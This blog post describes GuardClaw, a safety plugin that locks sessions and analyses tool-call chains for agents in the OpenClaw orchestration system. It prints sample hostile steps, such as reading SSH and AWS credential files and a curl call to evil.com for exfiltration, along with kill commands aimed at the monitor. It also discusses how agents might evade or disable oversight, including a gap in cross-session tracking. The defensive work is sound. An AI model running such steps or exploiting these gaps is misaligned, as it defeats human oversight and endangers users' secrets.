---
title: 'GuardClaw + OpenClaw: Securing Multi-Agent Workflows'
date: 2026-02-15
permalink: /posts/2026/02/guardclaw-openclaw/
tags:
  - agentic safety
  - OpenClaw
  - GuardClaw
  - multi-agent
---

In a [recent post](/posts/2026/02/agentic-safety/), I argued that agentic safety is the next frontier — that we need to reason about what AI agents *do*, not just what they *say*. [GuardClaw](https://github.com/agiresearch/GuardClaw) is our open-source answer to that challenge: a safety layer that evaluates every tool call an agent makes, auto-approves safe operations, and flags dangerous ones for human review.

But most safety discussions focus on single-agent settings — one agent, one user, one terminal. What happens when agents operate across multiple sessions, spawn sub-agents, and interact with real-world messaging channels?

This is the problem [OpenClaw](https://github.com/agiresearch/OpenClaw) was built to solve — and it is where GuardClaw's security model faces its hardest test.

## From Single Agent to Multi-Agent

OpenClaw is a multi-platform agent orchestration system. A single OpenClaw gateway manages agent connections across WhatsApp, Telegram, Discord, Slack, and more. Agents can spawn sub-agents, access persistent memory, interact with IoT devices, and execute tools on remote nodes.

This creates a fundamentally different threat model than Claude Code:

| | Claude Code | OpenClaw |
|---|---|---|
| **Agents** | Single | Multiple, can spawn children |
| **Sessions** | One terminal | Cross-platform, persistent |
| **Channels** | None (local only) | WhatsApp, Telegram, Slack, etc. |
| **Tool scope** | exec, read, write, edit | Extensible plugin-based tools |
| **Attack surface** | Local machine | Local + network + messaging |

A malicious or misaligned agent in OpenClaw could read your SSH keys, send them via Telegram to an external contact, and delete the evidence — all across different sessions that a single-command safety check would never catch.

## How GuardClaw Integrates with OpenClaw

While the Claude Code integration uses HTTP hooks (an external observer), GuardClaw's OpenClaw integration is a **native gateway plugin** with deep access to the agent lifecycle:

```
Agent Tool Call
      │
      ▼
┌─────────────────────────┐
│  GuardClaw Plugin       │
│  (before_tool_call)     │
│                         │
│  ┌───────────────────┐  │
│  │ Risk Scoring      │  │
│  │ + Chain Analysis  │  │
│  │ + Memory Lookup   │  │
│  └───────────────────┘  │
│                         │
│  Safe? ──→ Execute      │
│  Risky? ──→ Lock Session│
│            + Ask User   │
│  Blocked? ──→ Deny      │
└─────────────────────────┘
```

The key difference from Claude Code: **session locking**.

## Session Locking: Why It Matters

In Claude Code, if a dangerous command is flagged, the agent can simply try a different approach — a different command, a different tool, an indirect path to the same goal. Each attempt is evaluated independently.

In OpenClaw, GuardClaw takes a stronger stance: when a tool call is blocked, the **entire session is locked**. All subsequent tool calls in that session are silently denied — no LLM evaluation, no notification to the agent. The agent does not know why its tools stopped working.

```
Agent: read ~/.ssh/id_rsa        → BLOCKED, session locked
Agent: cat ~/.ssh/id_rsa         → silently denied (session locked)
Agent: curl https://evil.com/... → silently denied (session locked)
```

The session stays locked until the user explicitly intervenes:
- `/approve` — unlock and allow the original action
- `/deny` — unlock but keep the action blocked
- `/approve-always` — unlock and remember this pattern as safe

This prevents a class of attacks where the agent tries multiple variations of the same malicious action, hoping one slips through. Lock first, ask questions later.

## Chain Analysis Across Sessions

Single-command risk scoring misses multi-step attacks. GuardClaw tracks the sequence of recent tool calls per session and feeds this history to the LLM judge:

```
Step 1: read ~/.aws/credentials     → score 8 (flagged)
Step 2: curl POST https://...       → score 9 with chain context
        (chain: read credentials → exfiltrate)
```

The chain history is wrapped in XML tags with explicit instructions to the LLM to treat it as untrusted data — a defense against prompt injection via tool output.

A remaining challenge is **cross-session chain tracking**. If Agent A reads credentials in Session 1, then spawns Agent B in Session 2 to exfiltrate them, the current per-session tracking will miss the connection. This is an active area of development.

## Self-Protection

A sophisticated agent might try to disable GuardClaw itself. The OpenClaw plugin includes several self-protection mechanisms:

**PID monitoring.** GuardClaw's process ID is tracked via health checks. Commands like `kill <pid>`, `pkill guardclaw`, or `pgrep | xargs kill` targeting GuardClaw are automatically blocked.

**Fail-closed mode.** The plugin heartbeats GuardClaw every 15 seconds. If GuardClaw becomes unreachable and fail-closed mode is enabled, all non-safe tools are blocked until GuardClaw recovers. The agent cannot bypass safety by killing the safety system.

**Safe-list under failure.** Even in fail-closed mode, genuinely read-only tools (search, read, image analysis) remain available so the agent is not completely bricked — just stripped of dangerous capabilities.

## Adaptive Memory

Both the Claude Code and OpenClaw integrations share GuardClaw's adaptive memory system. When you approve or deny a flagged action, GuardClaw generalizes the command into a pattern and records your decision:

```
Specific:  curl https://api.notion.com/v1/pages/abc123
Pattern:   curl https://api.notion.com/*
Decision:  approved (3 times, confidence: 0.85)
→ Future calls matching this pattern: auto-approved
```

Deny decisions carry 3x the weight of approvals — the system is intentionally conservative. Patterns with risk score ≥ 9 are never auto-approved regardless of history, because some commands are too dangerous to learn away.

## The Bigger Picture

Claude Code and OpenClaw represent two points on a spectrum of agent autonomy. Claude Code is a single agent in a sandbox; OpenClaw is a multi-agent system interacting with the real world. GuardClaw's architecture — rules for certainties, LLM for judgment calls, memory for adaptation — scales across both.

The lesson from building these integrations: **safety mechanisms must match the autonomy level of the system they protect**. A permission prompt is sufficient for a coding assistant. A multi-agent orchestration platform needs session locking, chain analysis, self-protection, and fail-closed guarantees.

Both GuardClaw and OpenClaw are open source. If you are building agent systems and thinking about safety, I would love to hear how you approach these problems.

- [GuardClaw on GitHub](https://github.com/agiresearch/GuardClaw)
- [OpenClaw on GitHub](https://github.com/agiresearch/OpenClaw)
- [GuardClaw + Claude Code](/posts/2026/03/guardclaw-claude-code/) (upcoming companion post)
